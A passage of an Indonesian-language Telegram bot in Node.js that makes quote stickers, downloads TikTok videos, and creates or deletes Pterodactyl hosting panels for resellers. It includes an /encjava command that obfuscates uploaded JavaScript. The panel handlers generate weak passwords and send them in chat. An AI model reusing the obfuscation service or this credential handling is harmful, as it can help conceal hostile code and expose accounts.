    ppuser = "https://telegra.ph/file/a059a6a734ed202c879d3.jpg";
  }

  const json = {
    type: "quote",
    format: "png",
    backgroundColor: "#000000",
    width: 812,
    height: 968,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: msg.from.first_name || "User",
          photo: { url: ppuser },
        },
        text: text,
        replyMessage: {},
      },
    ],
  };

  try {
    const res = await axios.post("https://bot.lyo.su/quote/generate", json, {
      headers: { "Content-Type": "application/json" },
    });

    const buffer = Buffer.from(res.data.result.image, "base64");
    const tempPath = path.join(__dirname, "qc_" + msg.from.id + ".webp");

    fs.writeFileSync(tempPath, buffer);

    await bot.sendSticker(chatId, tempPath, {
      reply_to_message_id: msg.message_id,
    });

    fs.unlinkSync(tempPath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Gagal membuat QC, coba lagi.");
  }
});

bot.onText(/\/encjava/, async (msg) => {
    const chatId = msg.chat.id;   
    const senderId = msg.from.id;
    const randomImage = MENU_IMAGE;
    const userId = msg.from.id.toString();
    if (shouldIgnoreMessage(msg)) return;
    
      
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝘖𝘸𝘯𝘦𝘳", url: settings.OWNER_URL }]
                ]
            }
        });
    }

    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "🙈 *Error:* Balas file .js dengan `/encjava`!", { parse_mode: "Markdown" });
    }
    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "🙈 *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }
    const encryptedPath = path.join(__dirname, `X-INCRASH-encrypted-${file.file_name}`);

    try {
        const progressMessage = await bot.sendMessage(chatId, "🔒 Memulai proses enkripsi...");
        await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");
        const fileData = await bot.getFile(file.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
        const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
        let fileContent = response.data.toString("utf-8");
        await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }
        await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getAphocalypsObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }
        await updateProgress(bot, chatId, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.promises.writeFile(encryptedPath, obfuscatedCode);
        await bot.sendDocument(chatId, encryptedPath, {
            caption: "🔥 *File terenkripsi siap digunakan!*\n<code>©Enc By X-INCRASH</code>",
            parse_mode: "HTML"
        });
        await updateProgress(bot, chatId, progressMessage, 100, "X-INCRASH Chaos Core Selesai");
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {}
    } catch (error) {
        await bot.sendMessage(chatId, `🙈 *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {}
    }
});

// TikTok
bot.onText(/^(\.|\#|\/)tiktok$/, async (msg) => {
    const chatId = msg.chat.id;
    if (shouldIgnoreMessage(msg)) return;
    bot.sendMessage(chatId, `Format salah example /tiktok link`);
  });
  

bot.onText(/\/tiktok (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1]; // Mengambil teks setelah perintah /tt
    if (shouldIgnoreMessage(msg)) return;

    if (!text.startsWith("https://")) {
        return bot.sendMessage(chatId, "Masukkan URL TikTok yang valid!");
    }

    try {
        bot.sendMessage(chatId, "⏳ Proses Kakkk");

        const result = await tiktokDl(text);

        if (!result.status) {
            return bot.sendMessage(chatId, "Terjadi kesalahan saat memproses URL!");
        }

        if (result.durations === 0 && result.duration === "0 Seconds") {
            let mediaArray = [];

            for (let i = 0; i < result.data.length; i++) {
                const a = result.data[i];
                mediaArray.push({
                    type: 'photo',
                    media: a.url,
                    caption: `Foto Slide Ke ${i + 1}`
                });
            }

            return bot.sendMediaGroup(chatId, mediaArray);
        } else {
            const video = result.data.find(e => e.type === "nowatermark_hd" || e.type === "nowatermark");
            if (video) {
                return bot.sendVideo(chatId, video.url, { caption: "TikTok Downloader BY X-INCRASH ✅" });
            }
        }
    } catch (e) {
        console.error(e);
        bot.sendMessage(chatId, "Terjadi kesalahan saat memproses permintaan.");
    }
});
 
// Cpanel 
bot.onText(/\/1gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const nama = msg.from.username;
  const randomImage = MENU_CPANEL;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /1gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "1gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "1024";
  const cpu = "30";
  const disk = "1024";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = username+Math.random().toString(36).slice(2,5);
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${nama} Panel kamu berhasil dibuat

<b>Berikut adalah detail akun anda:</b>

• Username : <code>${user.username}<code>
• Password : <code>${password}<code> 

• ID : ${user.id}
• NAMA : ${username}
• EMAIL : ${email}
• RAM : 1gb

<blockquote>Note: Silahkan login dan ganti password anda demi keamanan. Jangan berikan detail akun ini kepada siapapun!</blockquote>
`,
 parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌐 Login", url: domain },
        { text: "🔑 Salin Password", switch_inline_query_current_chat: password }
      ],
    ],
  },
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//2Gb
bot.onText(/\/2gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const nama = msg.from.username;
  const randomImage = MENU_CPANEL;
  if (shouldIgnoreMessage(msg)) return;
    
    if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /2gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "2gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "2048";
  const cpu = "60";
  const disk = "2048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}_${u}@Danz.my.id`;
  const akunlo = randomImage;
  const password = username+Math.random().toString(36).slice(2,5);
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${nama} Panel kamu berhasil dibuat

<b>Berikut adalah detail akun anda:</b>

• Username : <code>${user.username}<code>
• Password : <code>${password}<code> 

• ID : ${user.id}
• NAMA : ${username}
• EMAIL : ${email}
• RAM : 2gb

<blockquote>Note: Silahkan login dan ganti password anda demi keamanan. Jangan berikan detail akun ini kepada siapapun!</blockquote>
`,
 parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌐 Login", url: domain },
        { text: "🔑 Salin Password", switch_inline_query_current_chat: password }
      ],
    ],
  },
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

//3gb
bot.onText(/\/3gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const nama = msg.from.username;
  const randomImage = MENU_CPANEL;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(senderId) && !isAdp(userId) && !isReseller(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /3gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "3gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "3072";
  const cpu = "90";
  const disk = "3072";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = username+Math.random().toString(36).slice(2,5);
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di data panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${msg.from.username} Panel kamu berhasil dibuat

<b>Berikut adalah detail akun anda:</b>

• Username : <code>${user.username}<code>
• Password : <code>${password}<code> 

• ID : ${user.id}
• NAMA : ${username}
• EMAIL : ${email}
• RAM : 3gb

<blockquote>Note: Silahkan login dan ganti password anda demi keamanan. Jangan berikan detail akun ini kepada siapapun!</blockquote>
`,
 parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌐 Login", url: domain },
        { text: "🔑 Salin Password", switch_inline_query_current_chat: password }
      ],
    ],
  },
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

//4gb
bot.onText(/\/4gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_CPANEL;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /4gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "4gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "4048";
  const cpu = "110";
  const disk = "4048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = username+Math.random().toString(36).slice(2,5);
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${msg.from.username} Panel kamu berhasil dibuat

<b>Berikut adalah detail akun anda:</b>

• Username : <code>${user.username}<code>
• Password : <code>${password}<code> 

• ID : ${user.id}
• NAMA : ${username}
• EMAIL : ${email}
• RAM : 4gb

<blockquote>Note: Silahkan login dan ganti password anda demi keamanan. Jangan berikan detail akun ini kepada siapapun!</blockquote>
`,
 parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌐 Login", url: domain },
        { text: "🔑 Salin Password", switch_inline_query_current_chat: password }
      ],
    ],
  },
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 5gb
bot.onText(/\/5gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_CPANEL;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /5gb namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "5gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "5048";
  const cpu = "140";
  const disk = "5048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = username+Math.random().toString(36).slice(2,5);
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${msg.from.username} Panel kamu berhasil dibuat

<b>Berikut adalah detail akun anda:</b>

• Username : <code>${user.username}<code>
• Password : <code>${password}<code> 

• ID : ${user.id}
• NAMA : ${username}
• EMAIL : ${email}
• RAM : 5gb

<blockquote>Note: Silahkan login dan ganti password anda demi keamanan. Jangan berikan detail akun ini kepada siapapun!</blockquote>
`,
 parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🌐 Login", url: domain },
        { text: "🔑 Salin Password", switch_inline_query_current_chat: password }
      ],
    ],
  },
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/delsrv (.+)/, async (msg, match) => {
 const chatId = msg.chat.id;
 const senderId = msg.from.id;
 const srv = match[1].trim();
 if (shouldIgnoreMessage(msg)) return;

  if (!isOwner(senderId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  if (!srv) {
    bot.sendMessage(
      chatId,
      "Mohon masukkan ID server yang ingin dihapus, contoh: /delsrv 1234"
    );
    return;
  }

  try {
    let f = await fetch(domain + "/api/application/servers/" + srv, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });

    let res = f.ok ? { errors: null } : await f.json();

    if (res.errors) {
      bot.sendMessage(chatId, "SERVER TIDAK ADA");
    } else {
      bot.sendMessage(chatId, "SUCCESFULLY DELETE SERVER");
    }
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat menghapus server.");
  }
});

bot.onText(/\/6gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_CPANEL;
  if (shouldIgnoreMessage(msg)) return;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /6gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "6gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "6048";
  const cpu = "170";
  const disk = "6048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = username+Math.random().toString(36).slice(2,5);
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
